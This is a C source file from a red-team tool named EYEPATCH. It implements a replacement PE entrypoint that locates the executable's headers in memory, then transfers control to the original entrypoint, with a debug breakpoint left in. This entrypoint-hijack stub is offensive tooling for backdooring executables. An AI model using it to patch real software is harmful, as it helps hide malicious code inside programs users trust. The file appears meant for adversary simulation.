/*!
 *
 * EYEPATCH
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Acts as a replacement PE entrypoint. Executes code
 * in a new virtual memory region, waits until it 
 * exits, then calls the original code.
 *
!*/
D_SEC( A ) INT WINAPI WinMain( HINSTANCE Instance, HINSTANCE hPrevInstance, LPSTR CommandLine, INT ShowCmd ) 
{
	PCONFIG			Cfg = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	Cfg = C_PTR( G_END() );
	Dos = C_PTR( G_PTR( WinMain ) );
	Dos = C_PTR( U_PTR( U_PTR( Dos ) &~ ( 0x1000 - 1 ) ) );

	do 
	{
		/* Has the DOS MZ Signature? */
		if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {

			/* Is in between the size */
			if ( Dos->e_lfanew < 0x200 ) {
				/* Get a pointer to the NT Header */
				Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );

				/* Has the "NT" signature */
				if ( Nth->Signature == IMAGE_NT_SIGNATURE ) {
					/* Break! */
					break;
				};
			};
		};

		/* Decrement */
		Dos = C_PTR( U_PTR( U_PTR( Dos ) - 0x1000 ) );
	} while ( Dos != 0 );

	__debugbreak();

	/* Execute entrypoint */
	return ( ( __typeof__( WinMain ) * ) C_PTR( U_PTR( Dos ) + Cfg->AddressOfEntryPoint ) )(
			Instance, hPrevInstance, CommandLine, ShowCmd
	);
};
